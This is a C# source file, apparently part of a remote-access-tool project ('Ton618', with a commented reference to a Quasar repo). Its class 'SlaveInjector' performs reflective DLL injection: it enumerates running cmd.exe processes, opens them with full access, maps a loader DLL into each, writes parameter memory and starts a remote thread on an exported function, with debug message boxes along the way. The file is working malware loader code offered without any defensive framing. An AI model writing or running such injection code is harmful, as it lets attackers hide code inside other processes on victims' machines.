using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Ton618.Utilities;
using static Ton618.Utilities.ClientNatives;

namespace Ton618.Loader
{
    internal class SlaveInjector
    {
        public SlaveInjector()
        {
        }
        //void LoadManaged(LPCWSTR dotNetVersion, LPCWSTR szDllLocation, LPCWSTR szMainClass, LPCWSTR szMainMethod, LPCWSTR szParameters)

        private delegate void LoadManaged(
            [MarshalAs(UnmanagedType.LPWStr)] string dotNetVersion,
            [MarshalAs(UnmanagedType.LPWStr)] string szDllLocation,
            [MarshalAs(UnmanagedType.LPWStr)] string szMainClass,
            [MarshalAs(UnmanagedType.LPWStr)] string szMainMethod,
            [MarshalAs(UnmanagedType.LPWStr)] string szParameters
            );

        private delegate void NotifyLoad([MarshalAs(UnmanagedType.LPWStr)] string message);

        public void FindAndInject()
        {
            var bytes = File.ReadAllBytes("Q3C273.CLRLoader.dll");

            //var setpriv = ReflectiveDllLoader.SetPrivilege();
            //MessageBox.Show("SetPrivilege finished: " + setpriv);
            var procs = Process.GetProcessesByName("cmd");

            MessageBox.Show("Candidate count " + procs.Length);
            foreach (var proc in procs)
            {
                var pid = GetProcessId(proc.Handle);
                if (pid == 0)
                    continue;
                //MessageBox.Show("Candidate explorer.exe pid " + pid);
                //
                //var parentp = ParentProcessUtilities.GetParentProcess(pid);
                //
                //if (parentp != null && parentp.ProcessName.Contains("svchost")) // We don't want to inject to an auxiliary explorer processes.
                //    continue;

                MessageBox.Show("Will inject to pid " + pid);

                var handle = OpenProcess(ProcessAccessRights.PROCESS_ALL_ACCESS, false, pid);

                MessageBox.Show("explorer.exe handle " + handle);

                var loader = new DllLoader(bytes);
                (IntPtr local, IntPtr remote) = loader.Inject(handle);

                MessageBox.Show("Injected to local " + local + " remote " + remote);

                var str = "I'm here! Although no one knows where I came from.";
                var managedMem = Marshal.StringToHGlobalUni(str);
                var paramMem = VirtualAllocEx(handle, IntPtr.Zero, (UIntPtr)1024, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
                if (paramMem == IntPtr.Zero)
                    throw new Exception("Failed to allocate test method param mem.");
                var written = UIntPtr.Zero;
                var state = WriteProcessMemory(handle, paramMem, managedMem, (UIntPtr)1024, ref written);
                if (!state || written != (UIntPtr)1024)
                    throw new Exception("Failed to write test method param mem.");
                var tid = 0u;
                var funcpos = loader.GetProcAddr(local, "NotifyLoad");
                var relocFuncPos = funcpos.uminusptr(local).uplusptr(remote);
                MessageBox.Show("Found test method 'NotifyLoad' from " + funcpos + " are relocated to " + relocFuncPos);
                var thandle = CreateRemoteThread(handle, IntPtr.Zero, UIntPtr.Zero, relocFuncPos, paramMem, 0, ref tid);
                if (thandle == IntPtr.Zero)
                    throw new Exception("Failed to create test method caller thread.");
                WaitForSingleObject(thandle, 10000);
                //Marshal.GetDelegateForFunctionPointer<LoadManaged>(loader.GetProcAddr(local, "LoadManaged"))("v4.0.30319", "D:\\Repo\\Quasar\\Bin\\Release\\Q3C273.InjectionTester.dll", "Q3C273.InjectionTester.Program", "main", "LoL");
                CloseHandle(handle);
                break;
            }
        }
    }
}
